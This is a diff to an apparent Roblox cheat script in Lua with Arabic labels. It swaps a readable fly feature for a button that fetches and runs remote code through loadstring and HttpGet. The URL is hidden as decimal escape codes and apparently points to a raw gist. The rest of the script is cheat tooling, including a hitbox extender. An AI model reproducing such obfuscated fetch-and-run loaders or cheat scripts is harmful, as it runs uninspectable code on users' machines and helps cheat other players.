@@ -214,49 +214,14 @@ PlayerTab:CreateSection("التحليق (Fly)")
 
 -- الطيران
 
-local Flying = false
-local FlySpeed = 50
-local player = game.Players.LocalPlayer
-
-PlayerTab:CreateSection("الطيران")
-
-PlayerTab:CreateToggle({
-   Name = "تفعيل الطيران",
-   CurrentValue = false,
-   Callback = function(Value)
-      Flying = Value
-      local char = player.Character or player.CharacterAdded:Wait()
-      local root = char:WaitForChild("HumanoidRootPart")
-      local hum = char:WaitForChild("Humanoid")
-
-      if Flying then
-         local bv = Instance.new("BodyVelocity", root)
-         bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-         
-         local bg = Instance.new("BodyGyro", root)
-         bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
-
-         task.spawn(function()
-            while Flying and root do
-               -- الطيران يتبع اتجاه الكاميرا وزر المشي
-               bv.Velocity = workspace.CurrentCamera.CFrame.LookVector * (hum.MoveDirection.Magnitude > 0 and FlySpeed or 0)
-               bg.CFrame = workspace.CurrentCamera.CFrame
-               task.wait()
-            end
-            bv:Destroy()
-            bg:Destroy()
-         end)
-      end
+PlayerTab:CreateButton({
+   Name = "تشغيل سكربت الطيران (المشفر)",
+   Callback = function()
+      -- وضع الكود المشفر هنا ليتم استدعاؤه عند الضغط على الزر
+      loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\114\97\119\47\54\53\101\53\100\48\102\97\53\54\51\100\53\54\54\54\54\54\102\51\97\53\98\53\53\54\52\102\100\102\53\101\47\102\108\121"))()
    end,
 })
 
-PlayerTab:CreateSlider({
-   Name = "سرعة الطيران",
-   Range = {10, 300},
-   Increment = 10,
-   CurrentValue = 50,
-   Callback = function(v) FlySpeed = v end,
-})
 
 PlayerTab:CreateToggle({
    Name = "تفعيل الضربة البعيدة (Hitbox)",
